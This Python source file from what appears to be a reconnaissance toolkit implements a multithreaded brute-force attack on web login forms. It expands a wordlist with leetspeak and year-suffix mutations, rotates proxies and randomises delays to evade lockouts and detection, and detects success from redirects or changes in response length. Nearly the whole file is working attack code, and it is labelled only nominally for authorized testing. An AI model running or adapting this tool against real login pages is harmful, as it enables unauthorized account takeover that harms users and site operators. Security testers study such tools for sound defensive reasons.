# enums/dict_brute_force.py

import requests
import threading
import time
import random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from typing import List, Optional, Tuple, Dict

# Assuming these are defined in a central utility file later
USER_AGENT = "ReconTool/2.0 (authorized-testing-only)"
HEADERS = {"User-Agent": USER_AGENT}
DEFAULT_TIMEOUT = 8
MAX_THREADS = 50
STOP_EVENT = threading.Event()
def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs, flush=True)
    except Exception:
        pass

def load_file_lines(path: str) -> List[str]:
    if not path or not os.path.exists(path):
        return []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return lines
    except Exception:
        return []

class BruteForcer:
    def __init__(self, target_url: str, username_field: str = "username",
                 password_field: str = "password", method: str = "POST",
                 wordlist: str = "wordlist.txt", threads: int = 10,
                 proxies: Optional[List[str]] = None, delay_range: Tuple[float, float] = (0.5, 1.5),
                 mutate: bool = False, hybrid_limit: int = 30):
        
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.method = method.upper()
        self.wordlist = wordlist
        self.threads = max(1, min(threads, MAX_THREADS))
        self.proxies = proxies or []
        self.delay_range = delay_range
        self.mutate = mutate
        self.hybrid_limit = hybrid_limit
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.found_password = None
        self._lock = threading.Lock()
        self.attempts = 0

    def _generate_mutations(self, word: str) -> List[str]:
        mutations = []
        if not self.mutate:
            return [word]
        
        subs = {"a": "@", "s": "$", "i": "!", "o": "0", "e": "3", "l": "1"}
        mutations.extend([word.lower(), word.upper(), word.capitalize()])
        
        for k, v in subs.items():
            mutations.append(word.replace(k, v))
            mutations.append(word.replace(k.upper(), v))
        
        for suffix in ["!", "123", "2023", "2024", "2025"]:
            mutations.append(word + suffix)
        
        if self.hybrid_limit > 0:
            for i in range(1, min(self.hybrid_limit + 1, 50)):
                mutations.append(f"{word}{i}")
        
        return mutations

    def _load_candidates(self) -> List[str]:
        words = load_file_lines(self.wordlist)
        if not words:
            safe_print("[!] Wordlist empty or not found")
            return []
        
        candidates = []
        safe_print(f"[*] Generating candidates from {len(words)} words...")
        
        for word in words[:500]:
            if STOP_EVENT.is_set():
                break
            candidates.append(word)
            if self.mutate:
                candidates.extend(self._generate_mutations(word))
        
        seen = set()
        unique = []
        for c in candidates:
            if c not in seen:
                unique.append(c)
                seen.add(c)
        
        safe_print(f"[+] Generated {len(unique)} unique candidates")
        return unique

    def _pick_proxy(self) -> Optional[Dict[str, str]]:
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {"http": proxy, "https": proxy}

    def _attempt(self, username: str, password: str ) -> Optional[requests.Response]:
        if STOP_EVENT.is_set():
            return None
        
        data = {self.username_field: username, self.password_field: password}
        proxies = self._pick_proxy()
        
        try:
            if self.method == "POST":
                resp = self.session.post(self.target_url, data=data, timeout=DEFAULT_TIMEOUT, 
                                        proxies=proxies, allow_redirects=False)
            else:
                resp = self.session.get(self.target_url, params=data, timeout=DEFAULT_TIMEOUT,
                                       proxies=proxies, allow_redirects=False)
            
            with self._lock:
                self.attempts += 1
            return resp
        except:
            return None

    def _is_success(self, resp: Optional[requests.Response], baseline_length: Optional[int]) -> bool:
        if resp is None:
            return False
        
        if resp.status_code in [301, 302, 303, 307, 308]:
            return True
        
        if baseline_length is not None:
            if abs(len(resp.text) - baseline_length) > 100:
                return True
        
        return False

    def measure_baseline(self, username: str) -> Optional[int]:
        safe_print("[*] Measuring baseline response...")
        resp = self._attempt(username, "__invalid_password__")
        if resp is None:
            return None
        return len(resp.text)

    def run(self, username: str, output_json: Optional[Dict] = None) -> Optional[str]:
        safe_print(f"\n[*] Starting brute force on {self.target_url}")
        safe_print(f"[*] Username: {username}")
        
        candidates = self._load_candidates()
        if not candidates:
            return None
        
        baseline = self.measure_baseline(username)
        safe_print(f"[*] Testing {len(candidates)} passwords with {self.threads} threads...")
        
        pbar = tqdm(total=len(candidates), desc="Brute Force", unit="pwd")
        
        def worker(pw: str):
            if STOP_EVENT.is_set() or self.found_password:
                return
            time.sleep(random.uniform(*self.delay_range))
            resp = self._attempt(username, pw)
            pbar.update(1)
            
            if self._is_success(resp, baseline):
                with self._lock:
                    if not self.found_password:
                        self.found_password = pw
                        safe_print(f"\n[+] PASSWORD FOUND: {pw}")
        
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(worker, pw) for pw in candidates]
                for future in as_completed(futures):
                    if STOP_EVENT.is_set() or self.found_password:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
        finally:
            pbar.close()
        
        if output_json is not None:
            output_json["brute"] = {
                "target": self.target_url,
                "username": username,
                "attempts": self.attempts,
                "found": self.found_password
            }
        
        return self.found_password
